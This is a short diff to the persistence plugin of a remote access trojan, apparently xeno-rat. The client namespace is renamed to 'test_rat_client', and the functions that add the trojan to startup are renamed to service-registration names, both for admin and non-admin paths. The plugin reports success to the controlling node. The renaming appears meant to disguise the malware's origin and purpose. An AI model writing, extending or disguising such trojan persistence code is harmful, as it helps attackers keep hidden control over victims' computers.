@@ -11,7 +11,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
-using xeno_rat_client;
+using test_rat_client;
 
 
 namespace Plugin
@@ -30,9 +30,9 @@ namespace Plugin
             }
             else if (data[0] == 0)
             {
-                if (Utils.IsAdmin())
+                if (Utils.IsElevated())
                 {
-                    if (await Utils.AddToStartupAdmin(executablePath))
+                    if (await Utils.RegisterServiceAdmin(executablePath))
                     {
                         await node.SendAsync(new byte[] { 1 });
                     }
@@ -43,7 +43,7 @@ namespace Plugin
                 }
                 else
                 {
-                    if (await Utils.AddToStartupNonAdmin(executablePath))
+                    if (await Utils.RegisterServiceNonAdmin(executablePath))
                     {
                         await node.SendAsync(new byte[] { 1 });
                     }
